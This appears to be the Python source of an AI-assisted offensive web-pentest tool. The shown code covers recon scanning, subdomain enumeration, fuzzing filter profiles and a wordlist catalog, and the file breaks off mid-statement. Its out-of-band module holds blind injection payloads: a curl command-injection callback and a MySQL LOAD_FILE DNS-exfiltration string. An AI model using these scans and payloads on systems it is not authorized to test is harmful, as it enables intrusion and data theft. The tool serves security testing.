#!/usr/bin/env python3
# coding: utf-8
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PENTEST AI v7.0 — MEGA EDITION                                              ║
║  Full AI-Driven · OWASP Top 10 · OOB · Playwright · File Upload · WebSocket ║
║  JWT Crack · CTF Mode · Recursive 403 · SmartProfile · ReconEngine           ║
║  FOR AUTHORIZED CTF / LAB / PENTEST USE ONLY                                 ║
╚══════════════════════════════════════════════════════════════════════════════╝

PIPELINE:
  0. RECON      → nmap · whatweb · wafw00f · subfinder · DNS · AI target select
  1. CRAWL      → links · forms · JS endpoints · API · SPA · Playwright browser
  2. SESSION    → login · cookie · JWT · CSRF · multi-role context
  3. FINGERPRINT→ SmartFuzzProfile (5-probe AI baseline) · custom 404 detection
  4. PARAMS     → HTML · hidden · JSON · JS vars · cookies · GraphQL params
  5. PAGE ANAL  → auth-wall · 3-layer BAC FP filter · AI verify
  6. BAC/IDOR   → multi-role comparison · IDOR numeric/UUID/hash
  7. AI PLANNER → endpoint prioritization by risk score
  8. SMART FUZZ → recursive dir/file fuzz · adaptive filters · AI per-hit verify
  9. OWASP FUZZ → SQLi·XSS·LFI·SSTI·CMDi·XXE·SSRF·IDOR·JWT per endpoint
  10. OOB        → interactsh blind SSRF·CMDi·SQLi·XXE callback detection
  11. EXPLOIT    → file upload webshell · JWT alg:none · JWT hashcat crack
  12. WEBSOCKET  → ws:// role escalation · injection · auth bypass
  13. OAUTH/SAML → state CSRF · open redirect · signature wrapping
  14. 403 BYPASS → recursive path·header·method bypass (3 qatlam chuqur)
  15. NUCLEI     → CVE · misconfig · default-creds · tech-based templates
  16. CORRELATE  → weak signals → confirmed findings
  17. FP FILTER  → confidence scoring · false-positive removal
  18. REPORT     → MD · JSON · endpoint graph

USAGE:
  python3 pentest_ai.py -t http://target.lab
  python3 pentest_ai.py -t http://10.10.10.1 --ctf --deep
  python3 pentest_ai.py -t http://app.lab -a /login -u admin -p admin123
  python3 pentest_ai.py -t http://app.lab -a /login -u user -p pass -U admin -P adminpass
  python3 pentest_ai.py -t http://target.com --playwright --oob
  python3 pentest_ai.py -t http://spa.lab --mode spa --deep --ctf

INSTALL:
  pip install requests ollama rich playwright selenium websocket-client
  playwright install chromium
  sudo apt install subfinder amass dnsx ffuf gobuster sqlmap dalfox commix
  sudo apt install wfuzz nikto nmap wafw00f whatweb nuclei interactsh-client
  sudo apt install seclists hashcat
"""

import argparse, asyncio, base64, collections, copy, datetime, difflib
import hashlib, html, http.cookiejar, json, os, queue, re, shutil, tempfile
import signal, ssl, subprocess, sys, threading, time, traceback
import urllib.error, urllib.parse, urllib.request
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

try:
    import ollama as _ollama
    HAS_OLLAMA = True
except ImportError:
    HAS_OLLAMA = False

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3; urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
    from rich.markdown import Markdown
    from rich.syntax import Syntax
    from rich import box
    HAS_RICH = True
    console = Console()
except ImportError:
    HAS_RICH = False
    class _Con:
        def print(self, *a, **k):
            print(*[re.sub(r'\[.*?\]', '', str(x)) for x in a])
        def rule(self, t=""): print("─" * 70 + f" {t}")
    console = _Con()

# ─────────────────────────────────────────────────────────────────────────────
# GLOBAL CONFIG
# ─────────────────────────────────────────────────────────────────────────────
MODEL_NAME = os.environ.get("OLLAMA_MODEL", "minimax-m2.5:cloud")
REPORT_DIR = Path("pentest_reports")
REPORT_DIR.mkdir(exist_ok=True)

OLLAMA_HOST = os.environ.get("OLLAMA_HOST", "http://localhost:11434")

DEFAULT_TIMEOUT  = 12
MAX_CRAWL_DEPTH  = 3
MAX_URLS         = 300
MAX_WORKERS      = 8
MIN_CONFIDENCE   = 45
BASELINE_REPEATS = 3
AGENTIC_MAX      = 14
DEFAULT_UA       = "Mozilla/5.0 (X11; Linux x86_64) PentestAI/7.0"

BANNER = r"""
██████╗ ███████╗███████╗██████╗ ███████╗███████╗ ██████╗
██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝
██║  ██║█████╗  █████╗  ██████╔╝███████╗█████╗  ██║     
██║  ██║██╔══╝  ██╔══╝  ██╔═══╝ ╚════██║██╔══╝  ██║     
██████╔╝███████╗███████╗██║     ███████║███████╗╚██████╗
╚═════╝ ╚══════╝╚══════╝╚═╝     ╚══════╝╚══════╝ ╚═════╝
 DEEPSEC | proactive DE/EP&ffence matters
"""

# ─────────────────────────────────────────────────────────────────────────────
# DATA MODELS
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class Endpoint:
    url:        str
    method:     str  = "GET"
    params:     dict = field(default_factory=dict)
    headers:    dict = field(default_factory=dict)
    body:       str  = ""
    body_type:  str  = "form"
    auth_required: bool = False
    discovered_by: str  = ""
    depth:      int  = 0
    forms:      list = field(default_factory=list)
    score:      float = 0.0

@dataclass
class SessionContext:
    cookies:     dict = field(default_factory=dict)
    headers:     dict = field(default_factory=dict)
    role:        str  = "anonymous"
    username:    str  = ""
    jwt_token:   str  = ""
    csrf_token:  str  = ""
    login_url:   str  = ""
    logged_in:   bool = False

@dataclass
class Finding:
    owasp_id:     str
    owasp_name:   str
    title:        str
    risk:         str
    confidence:   int
    url:          str
    method:       str
    param:        str
    payload:      str
    evidence:     str
    baseline_diff:str
    tool_output:  str
    request_raw:  str
    response_raw: str
    exploit_cmd:  str
    remediation:  str
    confirmed:    bool      = False
    fp_filtered:  bool      = False
    oob:          bool      = False          # blind OOB callback confirmed
    chain:        List[str] = field(default_factory=list)  # exploit chain steps
    tool:         str       = ""
    timestamp:    str       = field(default_factory=lambda: datetime.datetime.now().isoformat())
    suppression_reason: str = ""

    def risk_idx(self) -> int:
        order = ["Critical","High","Medium","Low","Info"]
        return order.index(self.risk) if self.risk in order else 9

    def to_dict(self) -> dict:
        return self.__dict__.copy()

@dataclass
class BaselineFingerprint:
    status:       int
    body_len:     int
    body_hash:    str
    title:        str
    timing_avg:   float
    headers_sig:  str
    word_count:   int
    error_strings:list

# ─────────────────────────────────────────────────────────────────────────────
# SMART FUZZ PROFILE — AI bilan adaptive baseline
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class SmartFuzzProfile:
    """
    ffuf / gobuster / wfuzz uchun to'liq filter argumentlari.
    5 ta turli random URL probe qilib hosil qilinadi:
      - status codes  → -fc  (filter codes)
      - sizes         → -fs  (filter sizes)
      - words         → -fw  (filter words)
      - lines         → -fl  (filter lines)
    AI har bir probe natijasini tahlil qilib, qaysi filterlar kerakligini tanlaydi.
    """
    base_url:       str
    probe_results:  list   # [{"url", "status", "size", "words", "lines", "title", "hash"}]
    filter_codes:   list   # e.g. [404, 403]
    filter_sizes:   list   # e.g. [1234, 1456]
    filter_words:   list   # e.g. [87]
    filter_lines:   list   # e.g. [42]
    filter_hashes:  list   # identical body hashes
    match_codes:    list   # e.g. [200, 201, 301, 302]
    tolerance_bytes: int   # ±N bytes tolerance for size filter
    ai_explanation: str    # AI nima aniqladi
    recursive:      bool   # yangi papkalar topilganda rekursiv kir
    depth:          int    # rekursiya chuqurligi

    def ffuf_filter_args(self) -> str:
        """ffuf uchun to'liq -fc/-fs/-fw/-fl argumentlari."""
        args = []
        if self.filter_codes:
            args.append(f"-fc {','.join(str(c) for c in self.filter_codes)}")
        if self.filter_sizes:
            # Tolerance bilan har bir size uchun range qo'shamiz
            # ffuf -fs faqat exact size qabul qiladi, shuning uchun range atrofidagi
            # barcha sizelarni bermaymiz — faqat asosiy sizelarni
            args.append(f"-fs {','.join(str(s) for s in self.filter_sizes)}")
        if self.filter_words:
            args.append(f"-fw {','.join(str(w) for w in self.filter_words)}")
        if self.filter_lines:
            args.append(f"-fl {','.join(str(l) for l in self.filter_lines)}")
        return " ".join(args)

    def gobuster_filter_args(self) -> str:
        """gobuster dir uchun --exclude-length argumenti."""
        args = []
        if self.filter_codes:
            # gobuster -b = blacklist status codes
            bad_codes = [str(c) for c in self.filter_codes if c not in (200,201,301,302)]
            if bad_codes:
                args.append(f"-b {','.join(bad_codes)}")
        if self.filter_sizes:
            args.append(f"--exclude-length {','.join(str(s) for s in self.filter_sizes)}")
        return " ".join(args)

    def wfuzz_filter_args(self) -> str:
        """wfuzz uchun --hc/--hs/--hw/--hl argumentlari."""
        args = []
        if self.filter_codes:
            args.append(f"--hc {','.join(str(c) for c in self.filter_codes)}")
        if self.filter_sizes:
            args.append(f"--hs {','.join(str(s) for s in self.filter_sizes)}")
        if self.filter_words:
            args.append(f"--hw {','.join(str(w) for w in self.filter_words)}")
        if self.filter_lines:
            args.append(f"--hl {','.join(str(l) for l in self.filter_lines)}")
        return " ".join(args)

    def summary(self) -> str:
        parts = []
        if self.filter_codes:  parts.append(f"fc={self.filter_codes}")
        if self.filter_sizes:  parts.append(f"fs={self.filter_sizes}")
        if self.filter_words:  parts.append(f"fw={self.filter_words}")
        if self.filter_lines:  parts.append(f"fl={self.filter_lines}")
        return "  ".join(parts) or "no filters"





# ─────────────────────────────────────────────────────────────────────────────
# RECON ENGINE — domain/IP uchun pre-scan
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class ReconResult:
    target_input:  str          # foydalanuvchi bergan input
    resolved_ip:   str          # IP manzil
    open_ports:    list         # [{"port":80,"service":"http","version":"nginx 1.18"}]
    http_targets:  list         # [{"url":"http://...","port":80,"ssl":False}]
    subdomains:    list         # ["sub.example.com", ...]
    waf:           str          # "Cloudflare" | "none" | "unknown"
    tech_stack:    dict         # whatweb output
    os_guess:      str          # nmap OS guess
    hostnames:     list         # reverse DNS + cert SANs
    raw_nmap:      str
    raw_whatweb:   str


class ReconEngine:
    """
    Domain yoki IP berilganda to'liq recon jarayoni:

    1. Input tahlil — URL mi, domain mi, IP mi?
    2. DNS resolution — IP olish, PTR, MX, NS
    3. nmap — ochiq portlar, service versiyalar
    4. HTTP/HTTPS target'lar aniqlash
    5. wafw00f — WAF detection
    6. whatweb — texnologiya fingerprint
    7. Subdomain discovery (subfinder yoki amass mavjud bo'lsa)
    8. AI barcha ma'lumotni tahlil qilib eng muhim targetlarni tanlaydi

    Qaytaradi: ReconResult va HTTP target URL'lar ro'yxati
    """

    # Web xizmatlar ko'p uchraydigan portlar
    WEB_PORTS = [
        80, 443, 8080, 8443, 8000, 8001, 8008, 8888,
        3000, 3001, 4000, 4443, 5000, 5001, 6443,
        7000, 7001, 9000, 9090, 9443, 10000,
        # Admin/dev portlar
        8081, 8082, 8083, 8084, 8085,
        # Common app portlar
        3128, 3306, 5432, 6379, 9200, 27017,
    ]

    def __init__(self, ai: "AIEngine"):
        self.ai = ai

    def run(self, target_input: str) -> ReconResult:
        """
        Asosiy recon metodi.
        target_input: "example.com", "192.168.1.1", "http://app.local", "10.0.2.2:5000"
        """
        console.print(f"\n[cyan]━━ RECON ━━[/cyan]")

        # 1. Input tahlil
        host, port_hint, is_ip, has_scheme = self._parse_input(target_input)
        console.print(f"  [dim]Input: host={host}  port_hint={port_hint}  "
                      f"is_ip={is_ip}  has_scheme={has_scheme}[/dim]")

        # 2. DNS resolution
        resolved_ip, hostnames = self._resolve(host)
        console.print(f"  [dim]Resolved: {host} -> {resolved_ip}  "
                      f"hostnames={hostnames[:3]}[/dim]")

        # 3. nmap port scan
        open_ports, os_guess, raw_nmap = self._nmap_scan(
            resolved_ip or host, port_hint
        )

        # 4. HTTP target'lar aniqlash
        http_targets = self._build_http_targets(
            host, resolved_ip or host, open_ports, port_hint, has_scheme,
            target_input
        )

        # 5. WAF detection
        waf = self._detect_waf(http_targets[0]["url"] if http_targets else f"http://{host}")

        # 6. whatweb
        tech_stack, raw_whatweb = self._whatweb(
            http_targets[0]["url"] if http_targets else f"http://{host}"
        )

        # 7. Subdomain discovery (faqat real domain uchun)
        subdomains = []
        if not is_ip and "." in host and not host.startswith("10.") \
                and not host.startswith("192.168.") and not host.startswith("172."):
            subdomains = self._subdomain_discovery(host)

        result = ReconResult(
            target_input = target_input,
            resolved_ip  = resolved_ip or host,
            open_ports   = open_ports,
            http_targets = http_targets,
            subdomains   = subdomains,
            waf          = waf,
            tech_stack   = tech_stack,
            os_guess     = os_guess,
            hostnames    = hostnames,
            raw_nmap     = raw_nmap,
            raw_whatweb  = raw_whatweb,
        )

        self._print_summary(result)

        # 8. AI eng muhim targetlarni tanlaydi
        if len(http_targets) > 1:
            http_targets = self._ai_prioritize(result)

        return result

    # ── 1. Input tahlil ───────────────────────────────────────────────────────
    def _parse_input(self, raw: str) -> tuple:
        """
        Qaytaradi: (host, port_hint, is_ip, has_scheme)
        Misol:
          "10.0.2.2:5000"    -> ("10.0.2.2", 5000, True, False)
          "http://app.local" -> ("app.local", 80, False, True)
          "example.com"      -> ("example.com", None, False, False)
        """
        has_scheme = raw.startswith(("http://", "https://"))
        if has_scheme:
            parsed    = urllib.parse.urlparse(raw)
            host      = parsed.hostname or raw
            port_hint = parsed.port or (443 if raw.startswith("https") else 80)
        elif "://" in raw:
            parsed    = urllib.parse.urlparse("http://" + raw)
            host      = parsed.hostname or raw
            port_hint = parsed.port
        else:
            # "10.0.2.2:5000" yoki "example.com:8080"
            if ":" in raw and not raw.count(":") > 1:  # IPv6 emas
                parts     = raw.rsplit(":", 1)
                host      = parts[0]
                try:
                    port_hint = int(parts[1])
                except ValueError:
                    host      = raw
                    port_hint = None
            else:
                host      = raw
                port_hint = None

        # IP yoki domain?
        is_ip = bool(re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", host))
        return host, port_hint, is_ip, has_scheme

    # ── 2. DNS ────────────────────────────────────────────────────────────────
    def _resolve(self, host: str) -> tuple:
        """IP, PTR, hostname list qaytaradi."""
        import socket
        hostnames = []
        try:
            ip = socket.gethostbyname(host)
        except Exception:
            ip = None

        # Reverse DNS
        if ip:
            try:
                ptr = socket.gethostbyaddr(ip)[0]
                if ptr and ptr != host:
                    hostnames.append(ptr)
            except Exception:
                pass

        # nmap bilan ham hostname olishga urinish
        if shutil.which("nmap") and ip:
            r = _run_cmd(f"nmap -sn --dns-servers 8.8.8.8 {ip} 2>/dev/null | grep 'Nmap scan'", timeout=10)
            m = re.search(r"\(([^)]+)\)", r.get("output",""))
            if m and m.group(1) not in hostnames:
                hostnames.append(m.group(1))

        return ip or host, hostnames

    # ── 3. nmap ───────────────────────────────────────────────────────────────
    def _nmap_scan(self, host: str, port_hint: int = None) -> tuple:
        """
        nmap bilan port scan.

        Strategiya:
        - port_hint berilgan (masalan :5000) → faqat shu port
        - port_hint yo'q → top-1000 + qo'shimcha web portlar
        - --version-intensity 5 — versiya aniqlik
        """
        if not shutil.which("nmap"):
            console.print("  [dim yellow]  nmap not found — skipping port scan[/dim yellow]")
            return [], "unknown", ""

        if port_hint:
            port_spec = str(port_hint)
            console.print(f"  [dim]  nmap: scanning port {port_hint} on {host}...[/dim]")
        else:
            extra_ports = ",".join(str(p) for p in self.WEB_PORTS)
            port_spec   = f"--top-ports 1000,{extra_ports}"
            # Unikal qilish
            port_spec   = f"--top-ports 1000 -p {extra_ports}"
            console.print(f"  [dim]  nmap: scanning top-1000 + web ports on {host}...[/dim]")

        cmd = (
            f"nmap -sV --version-intensity 5 "
            f"-p {port_spec if port_hint else ','.join(str(p) for p in self.WEB_PORTS)} "
            f"--open -T4 --script=http-title,http-headers,banner "
            f"-oN /tmp/nmap_{hashlib.md5(host.encode()).hexdigest()[:8]}.txt "
            f"{host}"
        ) if port_hint else (
            f"nmap -sV --version-intensity 5 "
            f"--top-ports 200 "
            f"-p {','.join(str(p) for p in self.WEB_PORTS)} "
            f"--open -T4 --script=http-title,http-headers,banner "
            f"-oN /tmp/nmap_{hashlib.md5(host.encode()).hexdigest()[:8]}.txt "
            f"{host}"
        )

        r          = _run_cmd(cmd, timeout=120)
        raw_output = r.get("output", "")
        open_ports = self._parse_nmap(raw_output)
        os_guess   = self._parse_os(raw_output)

        console.print(f"  [dim]  nmap: {len(open_ports)} open ports[/dim]")
        for p in open_ports[:15]:
            ssl_icon = "🔒" if p.get("ssl") else "  "
            console.print(
                f"  [dim]    {ssl_icon} {p['port']}/tcp  {p['service']:<12}  "
                f"{p['version'][:50]}[/dim]"
            )

        return open_ports, os_guess, raw_output

    def _parse_nmap(self, output: str) -> list:
        """nmap output'dan port ma'lumotlarini oladi."""
        ports  = []
        # "80/tcp   open  http    nginx 1.18.0"
        pattern = re.compile(
            r"^(\d+)/tcp\s+open\s+(\S+)\s*(.*?)$", re.MULTILINE
        )
        for m in pattern.finditer(output):
            port    = int(m.group(1))
            service = m.group(2).lower()
            version = m.group(3).strip()
            ssl     = "ssl" in service or port in (443, 8443, 4443, 6443)
            # http-title scripti
            title   = ""
            title_m = re.search(
                rf"{port}/tcp.*?http-title.*?\n.*?_\s+(.+?)\n", output, re.DOTALL
            )
            if title_m:
                title = title_m.group(1).strip()[:60]
            ports.append({
                "port":    port,
                "service": service,
                "version": version,
                "ssl":     ssl,
                "title":   title,
                "is_web":  self._is_web_port(port, service),
            })
        return ports

    def _parse_os(self, output: str) -> str:
        m = re.search(r"OS details?:\s*(.+?)\n", output)
        if m:
            return m.group(1).strip()[:80]
        m = re.search(r"Aggressive OS guesses?:\s*(.+?)\n", output)
        if m:
            return m.group(1).strip()[:80]
        return "unknown"

    def _is_web_port(self, port: int, service: str) -> bool:
        return (
            port in self.WEB_PORTS or
            "http" in service or
            "www" in service or
            "web" in service
        )

    # ── 4. HTTP target'lar ────────────────────────────────────────────────────
    def _build_http_targets(self, host: str, ip: str, open_ports: list,
                            port_hint: int, has_scheme: bool,
                            original_input: str) -> list:
        """
        Ochiq portlardan HTTP/HTTPS URL'lar ro'yxatini tuzadi.
        Har birini tekshirib, haqiqatan javob beradimi aniqlaydi.
        """
        targets = []
        checked = set()

        # Port_hint berilgan bo'lsa — faqat shu
        if port_hint and has_scheme:
            scheme = "https" if original_input.startswith("https") else "http"
            url    = f"{scheme}://{host}:{port_hint}" if port_hint not in (80, 443) else f"{scheme}://{host}"
            targets.append({"url": url.rstrip("/"), "port": port_hint,
                            "ssl": scheme == "https", "source": "input"})
            return targets

        if port_hint:
            # Port bor ama scheme yo'q — HTTP va HTTPS ikkalasini sinash
            for scheme in ("http", "https"):
                url = f"{scheme}://{host}:{port_hint}"
                if self._http_alive(url):
                    targets.append({"url": url.rstrip("/"), "port": port_hint,
                                    "ssl": scheme=="https", "source": "port_hint"})
                    checked.add(port_hint)
            if targets:
                return targets

        # nmap topgan portlardan
        web_ports = [p for p in open_ports if p.get("is_web")]
        for p in sorted(web_ports, key=lambda x: (
                0 if x["port"] in (80,443) else 1 if x["port"] in (8080,8443) else 2,
                x["port"]
        ))[:10]:
            port  = p["port"]
            if port in checked:
                continue
            ssl   = p.get("ssl", False) or port in (443, 8443, 4443)
            scheme = "https" if ssl else "http"
            url   = (f"{scheme}://{host}" if port in (80,443)
                     else f"{scheme}://{host}:{port}")
            if self._http_alive(url):
                targets.append({"url": url.rstrip("/"), "port": port,
                                "ssl": ssl, "source": "nmap"})
                checked.add(port)

        # Hech narsa topilmasa — default 80/443
        if not targets:
            for url in [f"http://{host}", f"https://{host}"]:
                if self._http_alive(url):
                    targets.append({"url": url, "port": 443 if "https" in url else 80,
                                    "ssl": "https" in url, "source": "default"})

        console.print(f"  [dim]  HTTP targets: {len(targets)} found[/dim]")
        for t in targets:
            lock_icon = "🔒" if t["ssl"] else "🌐"
            console.print(f"  [dim]    {lock_icon} {t['url']}[/dim]")

        return targets

    def _http_alive(self, url: str) -> bool:
        """URL javob beradimi? 3 soniya timeout."""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        try:
            req = urllib.request.Request(url, headers={"User-Agent": DEFAULT_UA})
            opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
            with opener.open(req, timeout=5) as r:
                return r.status < 600
        except Exception:
            return False

    # ── 5. WAF ────────────────────────────────────────────────────────────────
    def _detect_waf(self, url: str) -> str:
        if shutil.which("wafw00f"):
            r = _run_cmd(f"wafw00f '{url}' -a 2>/dev/null", timeout=30)
            out = r.get("output", "")
            # "The site http://... is behind ... WAF"
            m = re.search(r"is behind (.+?) (?:WAF|firewall)", out, re.I)
            if m:
                waf = m.group(1).strip()
                console.print(f"  [dim]  WAF detected: [bold yellow]{waf}[/bold yellow][/dim]")
                return waf
            if "no waf" in out.lower() or "not detected" in out.lower():
                return "none"
        # Fallback — response header'lardan aniqlash
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            req = urllib.request.Request(url, headers={"User-Agent": DEFAULT_UA})
            opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
            with opener.open(req, timeout=5) as r:
                hdrs = {k.lower(): v.lower() for k, v in r.headers.items()}
                if "cloudflare" in hdrs.get("server","") or "cf-ray" in hdrs:
                    return "Cloudflare"
                if "akamai" in str(hdrs):
                    return "Akamai"
                if "x-sucuri" in hdrs:
                    return "Sucuri"
        except Exception:
            pass
        return "unknown"

    # ── 6. whatweb ────────────────────────────────────────────────────────────
    def _whatweb(self, url: str) -> tuple:
        if not shutil.which("whatweb"):
            return {}, ""
        r   = _run_cmd(f"whatweb --color=never '{url}' 2>/dev/null", timeout=30)
        out = r.get("output", "")
        # Parse key technologies
        tech = {}
        for m in re.finditer(r"(\w[\w.-]+)\[([^\]]+)\]", out):
            key = m.group(1)
            val = m.group(2)[:80]
            if key not in ("HTTPServer","IP","Country","JQuery","Script","HTML5"):
                tech[key] = val
        if tech:
            console.print(f"  [dim]  Tech: {', '.join(list(tech.keys())[:8])}[/dim]")
        return tech, out

    # ── 7. Subdomain discovery ────────────────────────────────────────────────
    def _subdomain_discovery(self, domain: str) -> list:
        subs = set()

        if shutil.which("subfinder"):
            r = _run_cmd(f"subfinder -d '{domain}' -silent 2>/dev/null", timeout=60)
            for line in r.get("output","").splitlines():
                line = line.strip()
                if line and domain in line:
                    subs.add(line.lower())
            console.print(f"  [dim]  subfinder: {len(subs)} subdomains[/dim]")

        elif shutil.which("amass"):
            r = _run_cmd(f"amass enum -passive -d '{domain}' 2>/dev/null", timeout=90)
            for line in r.get("output","").splitlines():
                line = line.strip()
                if line and domain in line:
                    subs.add(line.lower())
            console.print(f"  [dim]  amass: {len(subs)} subdomains[/dim]")

        # DNS brute force (kichik list)
        common_subs = ["www","mail","api","dev","staging","test","admin",
                       "app","portal","dashboard","vpn","remote","login",
                       "auth","web","beta","demo","shop","store"]
        import socket
        for sub in common_subs:
            fqdn = f"{sub}.{domain}"
            try:
                socket.gethostbyname(fqdn)
                subs.add(fqdn)
            except Exception:
                pass

        result = sorted(subs)[:50]
        if result:
            console.print(f"  [dim]  Subdomains: {result[:5]}{'...' if len(result)>5 else ''}[/dim]")
        return result

    # ── 8. AI prioritization ─────────────────────────────────────────────────
    def _ai_prioritize(self, result: "ReconResult") -> list:
        """AI bir nechta HTTP target ichidan eng muhimini tanlaydi."""
        prompt = f"""Multiple HTTP targets found on {result.target_input}.
Targets: {json.dumps(result.http_targets, indent=2)}
Open ports: {json.dumps([{{'port':p['port'],'service':p['service'],'version':p['version'][:40]}} for p in result.open_ports], indent=2)}
WAF: {result.waf}
Tech: {list(result.tech_stack.keys())[:10]}

Prioritize targets for web application penetration testing.
Focus on: main app, admin panels, API endpoints.
Return JSON: {{"priority_targets": [{{"url":"...", "reason":"..."}}]}}"""
        ai_result = self.ai._call(prompt, cache=False) or {}
        priority  = ai_result.get("priority_targets", [])
        if not priority:
            return result.http_targets
        url_map = {t["url"]: t for t in result.http_targets}
        ordered = []
        for pt in priority:
            url = pt.get("url","")
            if url in url_map:
                t = dict(url_map[url])
                t["ai_reason"] = pt.get("reason","")
                ordered.append(t)
        remaining = [t for t in result.http_targets if t["url"] not in {p["url"] for p in ordered}]
        return ordered + remaining

    def _print_summary(self, r: "ReconResult"):
        if HAS_RICH:
            from rich.table import Table
            t = Table(title=f"Recon: {r.target_input}", box=box.ROUNDED, show_header=True)
            t.add_column("Item",  style="cyan", width=18)
            t.add_column("Value")
            t.add_row("IP",          r.resolved_ip or "?")
            t.add_row("OS",          r.os_guess[:60] or "unknown")
            t.add_row("WAF",         r.waf)
            t.add_row("Open ports",  str(len(r.open_ports)))
            t.add_row("HTTP targets",str(len(r.http_targets)))
            t.add_row("Subdomains",  str(len(r.subdomains)))
            tech_str = ", ".join(list(r.tech_stack.keys())[:8])
            t.add_row("Tech stack",  tech_str[:80] or "unknown")
            console.print(t)
        else:
            print(f"  IP: {r.resolved_ip}  WAF: {r.waf}  Ports: {len(r.open_ports)}")

# ─────────────────────────────────────────────────────────────────────────────
# OOB — interactsh orqali blind SSRF/CMDi/SQLi/XXE detection
# ─────────────────────────────────────────────────────────────────────────────
class OOBClient:
    """
    interactsh-client bilan Out-of-Band callback detection.
    Blind SSRF, blind CMDi, blind SQLi (DNS exfil), blind XXE uchun.

    Qanday ishlaydi:
      1. interactsh-client ishga tushadi — unikal *.oast.pro domain beradi
      2. Bu domain payload'larga kiritiladi: http://xyz.oast.pro/ssrf-test
      3. Server bu URL ga so'rov yuborsa — interactsh DNS/HTTP callback ni ko'radi
      4. oob.check() metodi: callback kelganmi tekshiradi
    """
    def __init__(self):
        self.domain    = ""
        self._results  : List[str] = []
        self._proc     = None
        self._lock     = threading.Lock()

    def start(self) -> bool:
        if not shutil.which("interactsh-client"):
            return False
        try:
            self._proc = subprocess.Popen(
                ["interactsh-client", "-json", "-v"],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            for _ in range(40):
                line = self._proc.stdout.readline()
                if not line:
                    time.sleep(0.2); continue
                try:
                    data = json.loads(line)
                    if data.get("domain"):
                        self.domain = data["domain"]
                        console.print(f"  [green]✓ OOB domain: {self.domain}[/green]")
                        t = threading.Thread(target=self._reader, daemon=True)
                        t.start()
                        return True
                except Exception:
                    pass
        except Exception:
            pass
        return False

    def _reader(self):
        if not self._proc: return
        for line in self._proc.stdout:
            if line:
                with self._lock:
                    self._results.append(line.strip())

    def check(self, token: str = "", wait: float = 2.0) -> bool:
        """token string callback da bormi tekshir. wait — necha sekund kutish."""
        time.sleep(wait)
        with self._lock:
            for r in self._results:
                if not token or token in r:
                    return True
        return False

    def payloads(self, token: str = "") -> dict:
        """Har xil protokol uchun payload'lar."""
        sfx = f"{token}.{self.domain}" if token else self.domain
        return {
            "http":  f"http://{sfx}/test",
            "https": f"https://{sfx}/test",
            "dns":   sfx,
            "ssrf":  f"http://{sfx}/ssrf",
            "xxe":   f"http://{sfx}/xxe",
            "cmdi":  f"curl http://{sfx}/cmd",
            "sqli_mysql": f"LOAD_FILE(CONCAT(0x5c5c5c5c,0x{sfx.encode().hex()},0x5c61))",
        }

    def stop(self):
        if self._proc:
            try: self._proc.terminate()
            except: pass


# ─────────────────────────────────────────────────────────────────────────────
# WORDLIST SCANNER — tizimda mavjud wordlist'larni bir marta skanerlaydi
# ─────────────────────────────────────────────────────────────────────────────
class WordlistScanner:
    """
    Kali Linuxda mavjud barcha .txt wordlist'larni skanerlaydi.
    Natijani kategoriya bo'yicha lug'atga yig'adi.
    Bu sinf faqat BIR MARTA ishga tushadi (singleton), keyin cache'dan oladi.
    """

    # Kali'da wordlist'lar saqlanadigan asosiy papkalar (ustuvorlik tartibi)
    SEARCH_ROOTS = [
        Path("/usr/share/seclists"),
        Path("/usr/share/wordlists"),
        Path("/usr/share/wfuzz/wordlist"),
        Path("/usr/share/dirb/wordlists"),
        Path("/usr/share/dirbuster"),
        Path("/opt/seclists"),
        Path("/opt/wordlists"),
        Path.home() / "wordlists",
        Path.home() / "SecLists",
    ]

    # Har bir kategoriya uchun fayl nomi ichida qidirilgan kalit so'zlar
    # (ustuvorlik tartibi: birinchi topilgan ishlatiladi)
    CATEGORY_KEYWORDS = {
        "lfi": [
            "lfi-jhaddix", "lfi-suite", "lfi_", "traversal",
            "path-traversal", "dotdot", "lfi",
        ],
        "sqli": [
            "sql-injection", "sqli", "sql_injection",
            "mysql", "mssql", "oracle", "postgres",
        ],
        "xss": [
            "xss", "cross-site", "html-injection",
        ],
        "ssti": [
            "ssti", "template-injection", "server-side-template",
        ],
        "ssrf": [
            "ssrf", "server-side-request",
        ],
        "cmdi": [
            "command-injection", "cmdi", "cmd-injection",
            "os-injection", "rce",
        ],
        "dirs": [
            "directory-list-2.3-medium",
            "directory-list-2.3-small",
            "common",
            "big",
            "directory-list",
        ],
        "params": [
            "burp-parameter-names",
            "parameter-names",
            "api-endpoints",
            "param",
        ],
        "passwords": [
            "rockyou",
            "top-100",
            "top-1000",
            "fasttrack",
            "common-credentials",
        ],
        "usernames": [
            "top-usernames",
            "usernames",
            "username",
        ],
        "api": [
            "api-endpoints",
            "api/",
            "graphql",
            "rest",
        ],
        "backup": [
            "backup",
            "sensitive-files",
            "config-files",
            "web-extensions",
        ],
    }

    _instance = None
    _catalog: dict[str, list[str]] = {}   # category → [path1, path2, ...]
    _scanned = False
    _lock = threading.Lock()

    @classmethod
    def get_catalog(cls) -> dict[str, list[str]]:
        """Tizimni bir marta skanerlaydi, keyin cache'dan qaytaradi."""
        with cls._lock:
            if cls._scanned:
                return cls._catalog
            cls._catalog = cls._scan()
            cls._scanned = True
            total = sum(len(v) for v in cls._catalog.values())
            filled = {k: v for k, v in cls._catalog.items() if v}
            empty  = [k for k, v in cls._catalog.items() if not v]
            console.print(f"[dim]  WordlistScanner: {total} wordlist(s) — "
                          f"{len(filled)} categories found, "
